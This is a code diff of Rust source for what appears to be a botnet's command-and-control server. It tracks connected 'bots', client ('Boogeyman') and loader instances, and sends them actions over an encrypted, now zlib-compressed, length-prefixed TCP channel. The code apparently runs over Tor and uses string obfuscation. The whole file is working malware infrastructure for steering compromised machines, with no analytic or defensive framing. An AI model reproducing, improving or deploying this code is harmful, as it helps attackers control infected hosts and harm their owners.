@@ -1,13 +1,15 @@
 use std::collections::HashMap;
+use std::io::Cursor;
 use std::net::SocketAddr;
+use std::time::Duration;
+use byteorder::{ ByteOrder, LittleEndian };
 use chrono::Utc;
 use client_vars::types::receive::BoogeymanReceivePayload;
 use client_vars::types::send::BoogeymanSendPayload;
 use loader_vars::types::receive::LdrRcv;
 use loader_vars::types::send::LdrSnd;
-use serde::Deserialize;
-use serde::Serialize;
 use shared::constants::communication_encryption_key;
+use shared::network::tor::MutexPtr;
 use shared::network::tor::ServerReceive;
 use shared::network::tor::SrvRcvTp;
 use shared::utils::config::MibCnfg;
@@ -22,27 +24,34 @@ use obfstr::obfstr as s;
 use tokio::net::TcpStream;
 use tokio::sync::Mutex;
 use tokio::sync::RwLock;
+use tokio::time::timeout;
 use std::sync::Arc;
 use client_vars::types::structs::BotState;
 use crate::router::client::route_client;
 use crate::router::loader::route_loader;
 use super::sanitization::verify_id_and_version;
+use flate2::read::ZlibDecoder;
+use flate2::write::ZlibEncoder;
+use flate2::Compression;
+use std::io::{ Read, Write, BufReader, BufWriter };
 
-#[derive(Serialize, Deserialize, Debug, Clone)]
+#[derive(Debug, Clone)]
 pub struct ClientInstance {
     pub join_date: String,
     pub version: u64,
     pub bot_state: BotState,
     pub console: String,
+    pub stream: MutexPtr<TcpStream>,
 }
-#[derive(Serialize, Deserialize, Debug, Clone)]
+#[derive(Debug, Clone)]
 pub struct LoaderInstance {
     pub join_date: String,
     pub version: u64,
     pub tag: String,
+    pub stream: MutexPtr<TcpStream>,
 }
 
-#[derive(Serialize, Deserialize, Debug, Clone)]
+#[derive(Debug, Clone)]
 pub struct Bot {
     pub id: String,
     pub client_instances: Vec<ClientInstance>,
@@ -96,7 +105,7 @@ impl ServerHandler {
                     println!("new connection!");
                     let self_clone = self.clone();
                     tokio::task::spawn(async move {
-                        if let Err(e) = Self::handle_client(&self_clone, stream).await {
+                        if let Err(e) = Self::handle_stream(&self_clone, stream).await {
                             eprintln!("Error handling client: {}", e);
                         }
                     });
@@ -108,13 +117,18 @@ impl ServerHandler {
         }
     }
 
-    async fn handle_client(&self, stream: TcpStream) -> Result<()> {
+    async fn handle_stream(&self, stream: TcpStream) -> Result<()> {
         let stream_reference = Arc::new(Mutex::new(stream));
         loop {
+            println!("reading data");
             let data = match Self::read_data(stream_reference.clone()).await {
                 Ok(data) => data,
                 Err(error) => {
                     eprintln!("read_data error: {}", error);
+                    if error.to_string().contains("Stream is closed") {
+                        stream_reference.lock().await.shutdown().await;
+                        return Ok(());
+                    }
                     continue;
                 }
             };
@@ -130,29 +144,71 @@ impl ServerHandler {
         }
     }
 
-    async fn read_data(stream_ref: Arc<Mutex<TcpStream>>) -> Result<Vec<u8>> {
-        let mut stream = stream_ref.lock().await;
-        let data_length = match stream.read_u32_le().await {
-            Ok(length) => length,
-            Err(error) => {
-                // means not our protocol message
-                // assume its conn close
-                return Err(anyhow::anyhow!(format!("Connection closed by client?: {}", error)));
+    async fn read_data(stream_ref: MutexPtr<TcpStream>) -> Result<Vec<u8>> {
+        let data_length: u32;
+        loop {
+            let mut stream = stream_ref.lock().await;
+            // println!("stream awaited, trying read u32");
+            let mut buf = [0; 4];
+            match timeout(Duration::from_millis(20), stream.read_exact(&mut buf)).await {
+                Ok(result) => {
+                    data_length = match result {
+                        Ok(_) => { LittleEndian::read_u32(&buf) }
+                        Err(error) => {
+                            if error.kind() == std::io::ErrorKind::UnexpectedEof {
+                                // Stream is closed
+                                return Err(anyhow::anyhow!("Stream is closed"));
+                            } else {
+                                return Err(
+                                    anyhow::anyhow!(format!("Error trying to read: {}", error))
+                                );
+                            }
+                        }
+                    };
+                    // break loop when we read the data
+                    break;
+                }
+                Err(error) => {
+                    // println!("timeout elapsed: {}", error);
+                    //? in here we should check if the queue has something only then unlock and sleep
+                    drop(stream);
+                    tokio::time::sleep(Duration::from_millis(20)).await;
+                }
             }
-        };
+            // let data_length = match stream.read_u32_le().await {
+            //     Ok(length) => length,
+            //     Err(error) => {
+            //         // means not our protocol message
+            //         // assume its conn close
+            //         println!("asd");
+            //         println!("read_u32_le error: {}", error);
+            //         // stream.shutdown().await?;
+            //         return Err(anyhow::anyhow!(format!("Connection closed by client?: {}", error)));
+            //     }
+            // };
+        }
+
+        println!("length read: {}", data_length);
+
+        let mut stream = stream_ref.lock().await;
 
         let mut data_buf = vec![0; data_length as usize];
         stream
             .read_exact(&mut data_buf).await
             .context(s!("Failed to read exact data from stream").to_string())?;
-        Ok(data_buf)
+
+        let mut decoder = ZlibDecoder::new(Cursor::new(data_buf));
+        let mut decompressed = Vec::new();
+        decoder.read_to_end(&mut decompressed).unwrap();
+        Ok(decompressed)
     }
 
     async fn handle_received_data(
         &self,
         data: Vec<u8>,
-        stream_ref: Arc<Mutex<TcpStream>>
+        stream_ref: MutexPtr<TcpStream>
     ) -> Result<()> {
+        println!("data: {:#?}", data);
         let decrypted_data = sauron_decrypt(
             convert_key_to_bytes(&communication_encryption_key()),
             &data
@@ -160,7 +216,7 @@ impl ServerHandler {
         let data: ServerReceive = serde_json
             ::from_slice(&decrypted_data)
             .context(s!("Failed to parse decrypted_data as ServerReceive").to_string())?;
-        println!("data: {:#?}", data);
+        println!("server receive: {:#?}", data);
 
         match data.server_receive_type {
             SrvRcvTp::Ldr => {
@@ -183,7 +239,7 @@ impl ServerHandler {
     }
 
     pub async fn send_action_to_loader(
-        stream_ref: Arc<Mutex<TcpStream>>,
+        stream_ref: MutexPtr<TcpStream>,
         action: loader_vars::types::receive::ClAct,
         params: loader_vars::types::receive::ClPrms
     ) -> Result<()> {
@@ -193,10 +249,10 @@ impl ServerHandler {
             .context(
                 s!("Failed to serialize LoaderReceivePayload struct to binary data").to_string()
             )?;
-        Self::encrypt_and_send(stream_ref, &binary_data).await
+        Self::encrypt_compress_and_send(stream_ref, &binary_data).await
     }
     pub async fn send_action_to_client(
-        stream_ref: Arc<Mutex<TcpStream>>,
+        stream_ref: MutexPtr<TcpStream>,
         action: client_vars::types::receive::ClientAction,
         params: client_vars::types::receive::ClientParams
     ) -> Result<()> {
@@ -206,19 +262,32 @@ impl ServerHandler {
             .context(
                 s!("Failed to serialize BoogeymanReceivePayload struct to binary data").to_string()
             )?;
-        Self::encrypt_and_send(stream_ref, &binary_data).await
+        Self::encrypt_compress_and_send(stream_ref, &binary_data).await
     }
 
-    async fn encrypt_and_send(stream_ref: Arc<Mutex<TcpStream>>, data: &[u8]) -> Result<()> {
+    async fn encrypt_compress_and_send(stream_ref: MutexPtr<TcpStream>, data: &[u8]) -> Result<()> {
+        println!("server sending data, len: {}", data.len());
         let encrypted_data = sauron_encrypt(
             convert_key_to_bytes(&communication_encryption_key()),
             data
         )?;
 
+        let mut encoder = ZlibEncoder::new(Vec::new(), Compression::new(5));
+        encoder.write_all(&encrypted_data).unwrap();
+
+        let compressed = encoder.finish().unwrap();
+
+        // then add u32 at start which is length
+
         let mut stream = stream_ref.lock().await;
+        println!("stream lock awaited, compressed and encrypted len: {}", compressed.len());
+
         stream
-            .write_all(&encrypted_data).await
-            .context(s!("Failed to write to stream").to_string())?;
+            .write_all(&(compressed.len() as u32).to_le_bytes()).await
+            .context(s!("Failed to write length of data to stream").to_string())?;
+        stream
+            .write_all(&compressed).await
+            .context(s!("Failed to write the data to stream").to_string())?;
         stream.flush().await.context(s!("Failed to flush stream").to_string())?;
         Ok(())
     }
